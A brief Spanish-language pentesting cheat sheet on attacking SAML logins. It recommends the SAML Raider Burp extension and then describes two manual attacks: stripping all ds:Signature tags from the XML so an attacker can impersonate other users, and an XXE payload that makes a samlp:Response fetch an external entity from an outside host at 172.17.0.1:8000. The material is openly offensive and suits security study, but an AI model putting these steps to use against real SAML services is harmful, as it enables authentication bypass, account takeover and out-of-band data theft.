## Atomático

SAML Raider en burp suite

---

## Manual
### Signature exclusion attack

Si un servidor está muy mal configurado, podríamos intentar borrar todas las signatures dentro del XML.

Estas signatures se encuentran en las tags **"ds:Signature"**.

Puede haber muchas signatures en un mismo xml.

Una vez eliminadas estas firmas podemos empezar a cambiar nuestros datos para imperonar a otros usuarios.

### XXE

Al ser un XML y trabajar con tags, podemos inyectar XXE. Ej:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://172.17.0.1:8000"> %xxe; ]>
    <samlp:Response>
    	[...]
    </samlp:Response>

